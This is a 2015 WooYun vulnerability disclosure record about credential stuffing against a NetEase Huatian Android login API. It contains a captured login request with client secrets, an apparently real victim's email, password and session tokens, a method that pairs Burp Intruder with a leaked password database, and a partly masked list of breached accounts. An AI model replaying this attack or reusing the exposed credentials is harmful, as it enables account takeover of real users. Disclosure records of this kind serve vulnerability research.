{"id": 69320, "wybug_id": "wooyun-2015-0138474", "wybug_title": "网易某手机应用登录设计不合理可导致撞库攻击", "wybug_corp": "网易", "wybug_author": "路人甲", "wybug_date": "2015-09-02 10:23", "wybug_open_date": "2015-10-21 11:30", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计不当"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-09-02：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-09-06：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-09-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-10-06：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-21：\t细节向公众公开  简要描述： 我的邮箱经常就收到异常登录信息，我就不知道怎么就异常啦，开始还以为是运营商IP调整了。今天算是知道了，是可以撞库的（上次写的简略了点没通过，这次详细些，麻烦Wooyun大哥在重点位置给打个码） 详细说明：  手机下载花田Android（去看美女去啦，穷买不起IOS不知道IOS是不是同样问题），然后连上burp，对就是登录处（username和password都没有加密），输入用户名123@163.com 密码1234567 抓包（这里隐去我的手机信息）\nPOST /api/authenticate HTTP/1.1device_info: {\"imei\":\"8XXXXXXXXXXXXXX8\"}deviceNo: 2xxxxxxxxxxxxxxxxxxxxx9device_model: xxxContent-Length: 187Content-Type: application/x-www-form-urlencodedHost: love.163.comConnection: Keep-AliveUser-Agent: Huatian App Android 4.4.4 Xiaomi v3.3.6 build 3362clientId=8Sy5I4RAFO42uSAGgP2kCWGf1z8GSBPPBaFg&clientSecret=k8xngPkFsQJSEAP7dh1kXk153txBdJa3wE3i&userName=123%40163.com&password=1234567&grantType=password&origin=android&oauth1Flag=oauth1\n发送到repeater，登录不成功返回\n{\"message\":\"密码错误\",\"requestUri\":\"/api/authenticate\",\"code\":537}\n如果网易账号存在，并且密码正确（即使花田账号没有激活也可以，以username：shaoyongabo477@163.com\tpwd：93344825为例）返回\n{\"uid\":\"-2571543843159483218\",\"token_secret2\":\"60df04296ecd4426d75c043b71e2f601\",\"connSign\":\"kDYgqY6AIeTyMbOPsWVYIuaFM2M=\",\"nonce\":\"Y7bArnx8AWcbHA7a\",\"email_avatar\":\"http://nos.netease.com/mail-online/66a5925e819b3a3b0429810360bf28ba/mail180x180.jpg\",\"access_token2\":\"2312224de56c8a368399fd6bf7220d02\",\"token_secret\":null,\"expires_in\":\"86400\",\"code\":\"1\",\"refresh_token\":\"f7da74d51fb044ffad41096da0018351\",\"connExpireTime\":\"1443877476756\",\"access_token\":\"f0fb105739356f146bd1a6aba4d17ac2\"}\n获得相应的token好了，发送到Intruder开始上CSDN密码库：\n\n   漏洞证明：  乌云需要复现过程，上一部分成功获得token（不一定能登录网易花田，没开通就登录不了，但是一定能登录网易通行证）的账号，撞库成功率非常高，只测试了邮箱是163的用户。\n\nmask 区域\n*****1\tPayloa**********@163.com\t**********63.com\t43**********63.com\t1359**********3.com\tshu**********m\t12345678**********163.com\t330**********63.com\t8868**********.com\ttt19**********63.com\t174**********d@163.com\t**********163.com\t4**********.com\tsylv**********com\t65767**********3.com\t12345**********com\ttz86**********163.com\t5**********@163.com\t**********.com\tshouh**********com\tlacri**********63.com\t90**********63.com\tzha**********163.com\t1**********@163.com\t24**********9@163.com\t**********com\t62245**********163.com\t3**********3.com\t7894**********3.com\t310**********om\taa1040**********om\tj13240**********@163.com\ta**********3.com\tcai**********3.com\t198**********.com\t48135**********.com\t1986**********63.com\t54**********163.com\tba**********.com\txiec**********63.com\t19**********63.com\tche**********.com\txia2**********OM\tctjlsb**********63.com\tdav**********.com\tfril**********163.com\taa**********163.com\tz**********3.com\t200**********m\tlijieer**********63.com\t19**********3.com\t35**********om\tJIAN1**********om\tUVK---**********163.com\t5**********63.com\tpro**********163.com\twe**********163.com\tli**********3.com\t198**********com\t20050**********3.com\t136**********163.com\tl**********3.com\tsoa**********@163.com\t**********com\tld381**********3.com\t!BP43G**********^^^*****\n\n随机选择上面截图中的一个账号，让我来登录下他的邮箱和网易通行证\n\n\n\n能进入用户中心，我相信左下边的网易服务就都能进去了，我就不一一继续验证了   修复方案：  引入nonce？验证码？或是其它方法？我就不懂了！对于多产品用同一账号登录，更需要保证安全，倘若我去利用邮箱重置淘宝密码、用花田发布酒托信息、或是其它想到想想不到的用途呢？除了撞库，利用花田进行暴力密码破解都是可以的，登录的HttpRequest一直都不过期会有礼物吗？会有高rank不？   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：4  确认时间：2015-09-06 11:29 厂商回复： 谢谢您对网易产品的关注，该漏洞已经修复完毕，准备更新上线。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 4, "Ranks": null}